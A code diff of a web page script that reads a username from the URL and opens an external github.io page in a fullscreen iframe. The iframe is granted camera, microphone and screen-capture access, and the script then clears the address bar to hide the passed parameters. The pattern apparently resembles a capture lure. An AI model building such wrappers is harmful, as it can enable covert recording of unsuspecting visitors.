@@ -41,29 +41,21 @@
 <body>
 
 <script>
-  // Read parameters
+  // Read username from URL
   const params = new URLSearchParams(window.location.search);
   const username = params.get("username");
-  const identifier = params.get("identifier");
-  const file = params.get("file");
 
-  if (!username || !identifier) {
+  if (!username) {
     document.body.innerHTML = `
       <div class="error">
-        Invalid or missing username / identifier
+        Invalid or missing username
       </div>
     `;
   } else {
-    // Base destination URL
-    let targetUrl =
-      "https://videos-1.github.io/archive-testing-222/index.html" +
-      "?username=" + encodeURIComponent(username) +
-      "&identifier=" + encodeURIComponent(identifier);
-
-    // Add file ONLY if it exists
-    if (file) {
-      targetUrl += "&file=" + encodeURIComponent(file);
-    }
+    // Converted destination URL
+    const targetUrl =
+      "https://page-1-1.github.io/yan-1-website-profilex-page/index.html?username=" +
+      encodeURIComponent(username);
 
     // Create fullscreen iframe
     const iframe = document.createElement("iframe");
@@ -83,13 +75,12 @@
       camera;
       microphone;
       display-capture;
-      web-share;
-      screen-wake-lock
+      web-share
     `;
 
     document.body.appendChild(iframe);
 
-    // Clean address bar
+    // Clean address bar (hide shared parameters)
     window.history.replaceState(null, "", window.location.pathname);
   }
 </script>
